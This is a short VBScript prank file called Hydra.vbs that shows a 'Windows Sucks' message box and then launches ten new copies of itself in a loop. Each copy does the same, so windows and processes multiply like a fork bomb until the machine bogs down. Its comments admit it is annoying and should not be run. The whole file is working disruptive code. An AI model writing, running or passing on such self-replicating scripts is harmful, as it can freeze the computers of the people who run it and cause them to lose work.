''Hydra.vbs
'' When the user closes one window, more will spawn
'' This is very annoying and shouldn't be run
Dim intcount

MsgBox "Windows Sucks"

Set WshShell = WScript.CreateObject("WScript.Shell")

intcount = 10 'modify for more/less windows
Do
    WshShell.run("hydra.vbs") 'modify for path of program to run
    intcount = intcount - 1
Loop While intcount > 0 
